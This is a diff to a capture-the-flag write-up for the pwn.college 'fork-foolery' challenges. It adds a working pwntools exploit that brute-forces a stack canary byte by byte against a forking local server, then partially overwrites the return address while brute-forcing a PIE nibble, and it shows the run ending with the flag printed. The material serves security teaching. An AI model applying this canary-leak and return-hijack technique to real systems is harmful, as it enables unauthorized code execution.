@@ -9210,7 +9210,7 @@ We know the address of `win_authed()` is `0x64a4a7ae87b4`, so the same offset wo
 
 ### Exploit
 
-```py title="~/script.py"
+```py title="~/script.py" showLineNumbers
 from pwn import *
 import struct
 
@@ -9719,10 +9719,10 @@ context.log_level = 'error'
 host = '127.0.0.1'
 port = 1337
 
-buffer_addr = 0x7ffd8aa00320
-canary_addr = 0x7ffd8aa00348
+buffer_addr = 0x7fffe51e2290
+canary_addr = 0x7fffe51e22b8
+addr_of_saved_ip = 0x7fffe51e22c8
 
-offset_to_canary = canary_addr - buffer_addr
 # Target instruction in win_authed() that skips the 0x1337 check
 safe_win_authed_offset = 0x2045 
 
@@ -9736,13 +9736,23 @@ for i in range(7):
         try:
             p = remote(host, port)
             p.recvuntil(b"Payload size: ")
-            p.sendline(str(offset_to_canary + 8).encode())
+
+            # Calculate current_guess, offset_to_canary, payload_size
+            current_guess = known_canary + p8(byte_guess)
+            offset_to_canary = canary_addr - buffer_addr
+            payload_size = offset_to_canary + len(current_guess)
             
+            # Send payload size
+            current_guess = known_canary + p8(byte_guess)
+            p.sendline(str(payload_size).encode())
+
+            # Carft payload
+            payload = b"A" * offset_to_canary
+            payload += current_guess
+
+            # Send payload
             p.recvuntil(b"bytes)!")
-            p.sendline(str(offset_to_canary + len(current_guess)).encode())
-            
-            p.recvuntil(b"bytes)!")
-            p.send(b"A" * offset_to_canary + current_guess)
+            p.send(payload)
             
             output = p.recvall(timeout=0.4)
             
@@ -9774,17 +9784,22 @@ while True:
     try:
         p = remote(host, port, timeout=1)
         p.recvuntil(b"Payload size: ")
+
+        # Calculate offset_to_ret, payload_size
+        offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
+        payload_size = offset_to_canary + 8 + offset_to_ret + 2
         
-        # 72 (buffer) + 8 (canary) + 8 (rbp) + 2 (partial rip) = 90
-        p.sendline(b"90")
-        p.recvuntil(b"bytes)!")
-        
+        # Send payload size
+        p.sendline(str(payload_size).encode())
+     
         # Build the payload using the canary we just leaked
         payload = b"A" * offset_to_canary
         payload += known_canary
-        payload += b"B" * 8
+        payload += b"B" * offset_to_ret
         payload += struct.pack("<H", safe_win_authed_offset)
-        
+
+        # Send payload
+        p.recvuntil(b"bytes)!")
         p.send(payload)
         
         output = p.recvall(timeout=1).decode(errors='ignore')
@@ -9803,189 +9818,141 @@ while True:
         pass
 ```
 
+```
+hacker@program-security~fork-foolery-hard:/$ python ~/script.py 
+[*] Stage 1: Brute-forcing Canary byte-by-byte...
+[+] Found byte 1: 0x84 | Current: 0x0084
+[+] Found byte 2: 0x7f | Current: 0x00847f
+[+] Found byte 3: 0x7c | Current: 0x00847f7c
+[+] Found byte 4: 0xd3 | Current: 0x00847f7cd3
+[+] Found byte 5: 0x74 | Current: 0x00847f7cd374
+[+] Found byte 6: 0xa9 | Current: 0x00847f7cd374a9
+[+] Found byte 7: 0xdb | Current: 0x00847f7cd374a9db
+[*] FINAL LEAKED CANARY: 0xdba974d37c7f8400
+[*] Stage 2: Starting RIP brute force loop (Target: 0x2045)
+[*] RIP Attempt 2000...
+```
 
+I first tried with the above script, until I realized that the parent process is persistent.
+So the sending the offset multiple times and hoping that the 4th least significant nibble of the actual address corresponds with the one I am sending won't be the best solution.
+For that we have to close the binary listener, start it again, and send our payloads again.
 
-
-
-
-
-### Brute forcing the canary
-
-Let's overwrite the known `\x00` byte of the canary with a `\x00` to see the program's output.
+The approach I settled on was to brute force the 4th least significant nibble actively.
 
 ```py title="~/script.py" showLineNumbers
 from pwn import *
+import struct
 
-# Configuration
-HOST = '127.0.0.1'
-PORT = 1337
-OFFSET_TO_CANARY = 72 
+context.arch = 'amd64'
+context.log_level = 'error'
 
-context.log_level = 'info'
+host = '127.0.0.1'
+port = 1337
 
-# 1. Connect
-p = remote(HOST, PORT)
+# Memory layout offsets from your GDB analysis
+# buffer: 0x...290 | canary: 0x...2b8 | saved_ip: 0x...2c8
+buffer_addr = 0x7fffe51e2290
+canary_addr = 0x7fffe51e22b8
+addr_of_saved_ip = 0x7fffe51e22c8
 
-# 2. Handle Size Prompt
-p.recvuntil(b"Payload size: ")
-# 72 bytes of padding + 1 byte for the canary null
-p.sendline(b"73")
+# Calculated offsets
+offset_to_canary = canary_addr - buffer_addr # 40 bytes
+offset_to_ret = addr_of_saved_ip - (canary_addr + 8) # 8 bytes (saved RBP)
 
-# 3. Send Payload
-p.recvuntil(b"bytes)!")
-# Payload: Padding followed by the first byte of the canary (\x00)
-payload = b"A" * OFFSET_TO_CANARY + b"\x00"
-p.send(payload)
+# The 3 least significant nibbles we are targeting
+TARGET_PAGE_OFFSET = 0x045 
 
-# 4. Print Response
-print("\n--- RESPONSE ---")
-print(p.recvall(timeout=1).decode(errors='ignore'))
+# --- STAGE 1: LEAK CANARY ---
+known_canary = b'\x00'
+print("[*] Stage 1: Brute-forcing Canary...")
 
-p.close()
+for i in range(7):
+    for byte_guess in range(256):
+        try:
+            p = remote(host, port)
+            p.recvuntil(b"Payload size: ")
+            
+            offset_to_canary = canary_addr - buffer_addr
+            current_guess = known_canary + p8(byte_guess)
+            p.sendline(str(offset_to_canary + len(current_guess)).encode())
+
+            payload = b"A" * offset_to_canary + current_guess
+            p.recvuntil(b"bytes)!")
+            p.send(payload)
+            
+            output = p.recvall(timeout=0.4)
+            if b"Goodbye!" in output and b"stack smashing" not in output:
+                known_canary += p8(byte_guess)
+                print(f"[+] Found byte {i+1}: {hex(byte_guess)} | Current: 0x{known_canary.hex()}")
+                p.close()
+                break
+            p.close()
+        except EOFError:
+            pass
+
+print(f"[*] FINAL LEAKED CANARY: {hex(u64(known_canary))}")
+
+# --- STAGE 2: BRUTE FORCE PIE NIBBLE ---
+print(f"[*] Stage 2: Brute-forcing PIE nibble for page offset {hex(TARGET_PAGE_OFFSET)}...")
+
+# We iterate through all 16 possibilities (0-F) for the 4th nibble
+for nibble in range(16):
+    # Combine the randomized nibble with our known page offset
+    target_addr = (nibble << 12) | TARGET_PAGE_OFFSET
+    
+    print(f"[*] Testing nibble {hex(nibble)} (Address suffix: {hex(target_addr)})...", end='\r')
+    
+    try:
+        p = remote(host, port)
+        p.recvuntil(b"Payload size: ")
+        
+        # 40 (padding) + 8 (canary) + 8 (rbp) + 2 (RIP overwrite) = 58 bytes
+        payload_size = offset_to_canary + 8 + offset_to_ret + 2
+        p.sendline(str(payload_size).encode())
+        p.recvuntil(b"bytes)!")
+        
+        payload = b"A" * offset_to_canary
+        payload += known_canary
+        payload += b"B" * offset_to_ret
+        payload += struct.pack("<H", target_addr)
+        
+        p.send(payload)
+        
+        # Give the server a moment to respond with the flag
+        output = p.recvrepeat(1.0).decode(errors='ignore')
+        
+        if "pwn.college{" in output:
+            print(f"\n\n[!] SUCCESS! Nibble {hex(nibble)} worked.")
+            print(output)
+            exit()
+        
+        if "Permission denied" in output:
+            print(f"\n[!] Hit correct nibble {hex(nibble)} but permissions failed. Target: {hex(target_addr)}")
+            
+        p.close()
+    except Exception:
+        continue
+
+print("\n[!] Brute-force complete. If no flag, check your stack offsets.")
 ```
 
 ```
-hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
-[+] Opening connection to 127.0.0.1 on port 1337: Done
+hacker@program-security~fork-foolery-hard:/$ python ~/2_script.py 
+[*] Stage 1: Brute-forcing Canary...
+[+] Found byte 1: 0x84 | Current: 0x0084
+[+] Found byte 2: 0x7f | Current: 0x00847f
+[+] Found byte 3: 0x7c | Current: 0x00847f7c
+[+] Found byte 4: 0xd3 | Current: 0x00847f7cd3
+[+] Found byte 5: 0x74 | Current: 0x00847f7cd374
+[+] Found byte 6: 0xa9 | Current: 0x00847f7cd374a9
+[+] Found byte 7: 0xdb | Current: 0x00847f7cd374a9db
+[*] FINAL LEAKED CANARY: 0xdba974d37c7f8400
+[*] Stage 2: Brute-forcing PIE nibble for page offset 0x45...
+[*] Testing nibble 0x9 (Address suffix: 0x9045)...
 
---- RESPONSE ---
-[+] Receiving all data: Done (2.57KB)
-[*] Closed connection to 127.0.0.1 port 1337
-
-You sent 73 bytes!
-Let's see what happened with the stack:
-
-+---------------------------------+-------------------------+--------------------+
-|                  Stack location |            Data (bytes) |      Data (LE int) |
-+---------------------------------+-------------------------+--------------------+
-| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
-| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
-| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
-| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
-| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
-| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 49 00 00 00 | 0x00000049a7aebab8 |
-| 0x00007fff04f2a740 (rsp+0x0030) | 49 00 00 00 00 00 00 00 | 0x0000000000000049 |
-| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
-| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a798 (rsp+0x0088) | 00 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb400 |
-| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
-| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
-+---------------------------------+-------------------------+--------------------+
-The program's memory status:
-- the input buffer starts at 0x7fff04f2a750
-- the saved frame pointer (of main) is at 0x7fff04f2a7a0
-- the saved return address (previously to main) is at 0x7fff04f2a7a8
-- the saved return address is now pointing to 0x64a4a7ae938e.
-- the canary is stored at 0x7fff04f2a798.
-- the canary value is now 0x2de0d345977cb400.
-- the address of win_authed() is 0x64a4a7ae87b4.
-
-If you have managed to overwrite the return address with the correct value,
-challenge() will jump straight to win_authed() when it returns.
-Let's try it now!
+[!] SUCCESS! Nibble 0x9 worked.
 
 Goodbye!
-### Goodbye!
+You win! Here is your flag:
+pwn.college{w6VFD6ynO9FNrkx1MGQ3P_3vFyz.0FOxMDL4ITM0EzW}
 ```
-
-Now, let's overwrite the `\x00` byte with a `\x01` byte.
-
-```py title="~/script.py" showLineNumbers
-from pwn import *
-
-# Configuration
-HOST = '127.0.0.1'
-PORT = 1337
-# OFFSET_TO_CANARY = 72 
-
-context.log_level = 'info'
-
-buffer_addr = 0x7ffd8aa00320
-canary_addr = 0x7ffd8aa00348
-
-OFFSET_TO_CANARY = canary_addr - buffer_addr
-
-# 1. Connect
-p = remote(HOST, PORT)
-
-# 2. Handle Size Prompt
-p.recvuntil(b"Payload size: ")
-# 72 bytes of padding + 1 byte for the canary null
-p.sendline(b"73")
-
-# 3. Send Payload
-p.recvuntil(b"bytes)!")
-# Payload: Padding followed by the first byte of the canary (\x00)
-payload = b"A" * OFFSET_TO_CANARY + b"\x00"
-p.send(payload)
-
-# 4. Print Response
-print("\n--- RESPONSE ---")
-print(p.recvall(timeout=1).decode(errors='ignore'))
-
-p.close()
-```
-
-```
-hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
-[+] Opening connection to 127.0.0.1 on port 1337: Done
-
---- RESPONSE ---
-[+] Receiving all data: Done (2.60KB)
-[*] Closed connection to 127.0.0.1 port 1337
-
-You sent 73 bytes!
-Let's see what happened with the stack:
-
-+---------------------------------+-------------------------+--------------------+
-|                  Stack location |            Data (bytes) |      Data (LE int) |
-+---------------------------------+-------------------------+--------------------+
-| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
-| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
-| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
-| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
-| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
-| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 49 00 00 00 | 0x00000049a7aebab8 |
-| 0x00007fff04f2a740 (rsp+0x0030) | 49 00 00 00 00 00 00 00 | 0x0000000000000049 |
-| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
-| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
-| 0x00007fff04f2a798 (rsp+0x0088) | 01 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb401 |
-| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
-| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
-+---------------------------------+-------------------------+--------------------+
-The program's memory status:
-- the input buffer starts at 0x7fff04f2a750
-- the saved frame pointer (of main) is at 0x7fff04f2a7a0
-- the saved return address (previously to main) is at 0x7fff04f2a7a8
-- the saved return address is now pointing to 0x64a4a7ae938e.
-- the canary is stored at 0x7fff04f2a798.
-- the canary value is now 0x2de0d345977cb401.
-- the address of win_authed() is 0x64a4a7ae87b4.
-
-If you have managed to overwrite the return address with the correct value,
-challenge() will jump straight to win_authed() when it returns.
-Let's try it now!
-
-Goodbye!
-*** stack smashing detected ***: terminated
-```
-
-The string `stack smashing detected` will be our oracle whch tells us if our brute-forced byte is correct.
-
-As for the return address brute force, we already know how to do it. But first we need the offset of the instruction within `win_authed()` which skips the authentication.
